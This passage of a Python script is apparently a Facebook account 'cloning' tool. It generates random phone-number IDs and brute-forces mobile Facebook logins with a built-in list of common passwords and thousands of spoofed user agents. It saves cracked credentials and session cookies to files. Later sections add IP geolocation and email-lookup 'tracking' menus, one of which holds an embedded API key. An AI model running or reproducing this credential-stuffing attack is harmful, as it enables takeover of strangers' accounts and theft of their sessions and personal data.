			pwx = [code,codex,code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+cod,codex+cod+co,code+codex+co,code+cod+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
			manshera.submit(rcrackm,uid,pwx,tl)
	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
	print('\x1b[1;94mCrack process has been completed')
	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK.txt,\x1b[1;91mⓇDX-CP.txt')
	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')

def rcrackm(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global proxy
	try:
		for ps in pwx:
			pro = random.choice(ugen)
			session = requests.Session()
			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {"authority": 'mbasic.facebook.com',
    "method": 'GET',
    "scheme": 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
				cek_apk(session,coki)
				open('/sdcard/RDX/ⓇDX-OK.txt', 'a').write( uid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
				open('/sdcard/RDX/ⓇDX-CP.txt', 'a').write( uid+' | '+ps+' \n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s][OK-{xr}%s{x}]\033[1;92m[CP-{xr}%s{x}] \r'%(bi,loop,tl,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass



try:
	print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
	v = 5.2
	update = ('5.2')
	update = ('5.2')
	if str(v) in update:
		os.system('clear')
	else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
	titik = ['.   ','..  ','... ','.... ']
	for o in titik:
		print('\r'+text+o),
		sys.stdout.flush();time.sleep(1)


#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)
    
# APK CHECK
def Rdx2x():
	user=[]
	twf =[]
	os.getuid
	os.geteuid
	os.system('clear')
	print(logo)
	print("\033[1;92mWHAT IS YOUR NAME?")
	name=input("\033[1;92mUSER NAME : \033[1;92m")
	os.system('clear')
	print(logo35)
	print(f' [{xr}^{x}] Example>: {xr}019,017,018,92302,92301,91778{x}')
	print(" ══════════════════════════════════════════")
	rk1 = '0171'
	rk2 = '0172'
	rk3 = '0175'
	rk4 = '017'
	code = random.choice([rk1,rk2,rk3])
	codex = ''.join(random.choice(string.digits) for _ in range(2))
	os.system('clear')
	print(logo1)
	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	os.system("clear")
	print(logo)
	passx = 0
	RdxID = []
	print("")
	for bilal in range(passx):
		pww = input(f"[*] Enter Password {bilal+1} : ")
		RdxID.append(pww)
	with ThreadPool(max_workers=50) as manshera:
		os.system('clear')
	print(logo36)
	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	os.system("clear")
	print(logo53)
	passx = 0
	RdxID = []
	print("")
	for bilal in range(passx):
		pww = input(f"[*] Enter Password {bilal+1} : ")
		RdxID.append(pww)
	with ThreadPool(max_workers=50) as manshera:
		os.system("clear")
		print(logo35)
		tl = str(len(user))
		jalan('\033[1;97m====================================================')
		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
		jalan('\033[1;97m====================================================')
		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNex       \033[1;34m: \033[0;97m"+codex)
		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
		print ('')
		for co in user:
			uid = code+codex+co
			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
			manshera.submit(rcrackx,uid,pwx,tl)
	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
	print('\x1b[1;94mCrack process has been completed')
	print('\x1b[1;94mIDs saved in \033[0;92mok.txt,\x1b[1;91mcp.txt')
	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
	print('')
	print('')
	print('\x1b[1;96mChose An Option')
	print('\x1b[1;92m [1] Continue ')
	print('\x1b[1;91m [0] Exit ')
	now = input('\x1b[1;96mSelect :-')
	if now=='1':
		login()
	elif now=='0':
		exit()



def rcrackx(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global proxy
	try:
		for ps in pwx:
			pro = random.choice(ugen)
			session = requests.Session()
			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {"authority": 'mbasic.facebook.com',
    "method": 'GET',
    "scheme": 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
				cek_apk(session,coki)
				open('/sdcard/RDX/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
				open('/sdcard/RDX/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
		sys.stdout.flush()
	except:
		pass


# APK CHECK
def Rdx3x():
	user=[]
	twf =[]
	os.getuid
	os.geteuid
	os.system('clear')
	print(logo)
	print("\033[1;92mWHAT IS YOUR NAME?")
	name=input("\033[1;92mUSER NAME : \033[1;92m")
	os.system('clear')
	print(logo34)
	jalan("     \33[37;41m\t  USE OUR COUNTRY CODE  \33[0;m")
	print('')
	jalan('\x1b[1;94m  PAK  CODES  :  \x1b[1;94m92301, \x1b[1;94m92302 ,\x1b[1;94m92303 ,\x1b[1;94m92305  ...\033[0;97m')
	jalan('\x1b[1;97m ══════════════════════════════════════════════════════════')
	jalan('\x1b[1;91m  INDIA CODES :  \x1b[1;91m91778, \x1b[1;91m91930 ,\x1b[1;91m91902 ,\x1b[1;91m91712  ...\033[0;97m')
	jalan('\x1b[1;97m ══════════════════════════════════════════════════════════')
	jalan('\x1b[1;92m  BD CODES    :  \x1b[1;92m88016, \x1b[1;92m88017 ,\x1b[1;92m88018 ,\x1b[1;92m88019  ...\033[0;97m')
	jalan('\x1b[1;97m ══════════════════════════════════════════════════════════\n')
	code = input(' PUT CODE : ')
	codex = ''.join(random.choice(string.digits) for _ in range(2))
	os.system('clear')
	print(logo36)
	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	os.system("clear")
	print(logo53)
	passx = 0
	RdxID = []
	print("")
	for bilal in range(passx):
		pww = input(f"[*] Enter Password {bilal+1} : ")
		RdxID.append(pww)
	with ThreadPool(max_workers=50) as manshera:
		os.system("clear")
		print(logo34)
		tl = str(len(user))
		jalan('\033[1;97m====================================================')
		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
		jalan('\033[1;97m====================================================')
		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSim Code       \033[1;34m: \033[0;97m"+code)
		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME      \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
		print ('')
		for co in user:
			uid = code+codex+co
			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
			manshera.submit(rcrackx,uid,pwx,tl)
	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
	print('\x1b[1;94mCrack process has been completed')
	print('\x1b[1;94mIDs saved in \033[0;92mok.txt,\x1b[1;91mcp.txt')
	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
	print('')
	print('')
	print('\x1b[1;96mChose An Option')
	print('\x1b[1;92m [1] Continue ')
	print('\x1b[1;91m [0] Exit ')
	now = input('\x1b[1;96mSelect :-')
	if now=='1':
		primex()
	elif now=='0':
		exit()


def rcrackx(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global proxy
	try:
		for ps in pwx:
			pro = random.choice(ugen)
			session = requests.Session()
			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {"authority": 'mbasic.facebook.com',
    "method": 'GET',
    "scheme": 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
				cek_apk(session,coki)
				open('/sdcard/RDX/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
				open('/sdcard/RDX/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
		sys.stdout.flush()
	except:
		pass




def track():
	os.system('clear')
	print(logo)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m[1]\x1b[1;92m Track IP Address')
	time.sleep(0.05)
	print("\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m[2]\x1b[1;93m E-mail Information")
	time.sleep(0.05)
	print("\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m[3]\x1b[1;96m Phone Information")
	time.sleep(0.05)
	print("\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m[0]\x1b[1;91m Exit")
	time.sleep(0.05)
	print('\x1b[1;96m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
	print('\x1b[1;97m«-----------------\x1b[1;92mRdx-76\x1b[1;97m---------------»')
	print('\x1b[1;96m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
	port()

def port():
	option = input('\n   \033[0;92mCHOOSE OPTION >>>\033[1;37m ')
	if option =='':
		print('\x1b[1;91mFill in correctly')
		track()
	elif option =='1':
		traceip()
	elif option =='2':
		mailx()
	elif option =='3':
		phonefo()
	elif option =='0':
		exit()


def traceip():
	os.system('clear')
	print(logo)
	targetip = input('\x1b[1;92mEnter IP Address To Track :- ')
	r = requests.get("http://ip-api.com/json/" + targetip + "?fields=66846719")
	print("\n\033[1;92m[*]\033[1;96m IP detail is given down below\n")
#	print()
	sleep(0.1)
	print("\033[1;92m \033[1;92m➤\033[1;96m Target IP      : " + str(r.json() ['query'] ))
	sleep(0.1)
	print("\033[1;92m \033[1;92m➤\033[1;96m Status Code    : " + str(r.status_code))
	sleep(0.1)
	if str(r.json() ['status']) == 'success':
		print(" \033[1;92m➤\033[1;96m Status         :\033[1;92m " + str(r.json() ['status']))
		sleep(0.1)
		
	elif str(r.json() ['status']) == 'fail':
		print(" \033[1;92m➤\033[1;96m Status         :\033[1;96m " + str(r.json() ['status']) + '\033[1;92m')
		sleep(0.1)
		print(" \033[1;92m➤\033[1;96m Message        : " + str(r.json() ['message']))
		sleep(0.1)
		if str(r.json() ['message']) == 'invalid query':
			print('\n\033[1;92m[!] \033[1;96m' + targetip + ' is an invalid IP Address, So you can try another IP Address.\n')
		elif str(r.json() ['message']) == 'private range':
			print('\n\033[1;92m[!] \033[1;96m' + targetip + ' is a private IP Address, So This IP can not be traced.\n')
		elif str(r.json() ['message']) == 'reserved range':
			print('\n\033[1;92m[!] \033[1;96m' + targetip + ' is a reserved IP Address, So This IP can not be traced.\n')
		else:
			print('\nCheck your internet connection.\n')
			track()

	print(" \033[1;92m➤\033[1;96m Continent      : " + str(r.json() ['continent']))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m Continent Code : " + str(r.json() ['continentCode'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m Country        : " + str(r.json() ['country'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m Country Code   : " + str(r.json() ['countryCode'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m Region         : " + str(r.json() ['region'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m Region Name    : " + str(r.json() ['regionName'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m City           : " + str(r.json() ['city'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m District       : " + str(r.json() ['district'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m ZIP Code       : " + str(r.json() ['zip'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m Latitude       : " + str(r.json() ['lat'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m Longitude      : " + str(r.json() ['lon'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m TimeZone       : " + str(r.json() ['timezone'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m Offset         : " + str(r.json() ['offset'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m Currency       : " + str(r.json() ['currency'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m ISP            : " + str(r.json() ['isp'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m Organization   : " + str(r.json() ['org'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m AS             : " + str(r.json() ['as'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m AS Name        : " + str(r.json() ['asname'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m Reverse        : " + str(r.json() ['reverse'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m Mobile         : " + str(r.json() ['mobile'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m Proxy          : " + str(r.json() ['proxy'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m Hosting        : " + str(r.json() ['hosting'] ))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m Location       : " + str(r.json() ['lat']) + ',' + str(r.json() ['lon']))
	sleep(0.1)
	print(" \033[1;92m➤\033[1;96m Google Map     : \033[1;94mhttps://maps.google.com/?q=" + str(r.json() ['lat']) + ',' + str(r.json() ['lon']))
	sleep(0.1)
	print()
	print('')
	print('')
	print('\x1b[1;96mIf You Continue Or Exit')
	print('\x1b[1;92m [1] Continue ')
	print('\x1b[1;91m [0] Exit ')
	now = input('\x1b[1;96mSelect :-')
	if now=='1':
		gogoolx()
	elif now=='0':
		exit()
	## google map ###################
def gogoolx():
	gomap = input("\033[1;92m[*]\033[1;96m Press ENTER To Open Location on Google ")
	if gomap == "":
		print()
		print("[*] Opening Location on google map")
		print()
		os.system("xdg-open https://maps.google.com/?q=" + str(r.json() ['lat']) + ',' + str(r.json() ['lon']) + " > /dev/null 2>&1")
		print()

	else:
		print()
		print("\033[1;92m[*] Aborting...")
		print()
	

	print('')
	print('')
	print('\x1b[1;96mIf You Continue Or Exit')
	print('\x1b[1;92m [1] Continue ')
	print('\x1b[1;91m [0] Exit ')
	now = input('\x1b[1;96mSelect :-')
	if now=='1':
		track()
	elif now=='0':
		exit()

 
############### Get Email information ############################################################################

def mailx():
	print()
	os.system('clear')
	print(logo)
	mailid = input('\x1b[1;92mEnter Terget Mail :- ')
	eml = requests.get("https://ipqualityscore.com/api/json/email/pPiATkSdtLn3xgKW7a7HikZeZ4HMNa2R/" + mailid )
	print()
    
	sleep(1)
	print()
	print("\033[1;92m[~]\033[1;96m E-mail Details are given down below")
	print()
	print("\033[1;92m➤\033[1;96m Target E-mail       : " + str(mailid) )
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Status Code         : " + str(eml.status_code) )
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Valid               : " + str(eml.json() ['valid']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Catch All           : " + str(eml.json() ['catch_all']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Common              : " + str(eml.json() ['common']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Deliverability      : " + str(eml.json() ['deliverability']))
	sleep(0.1)
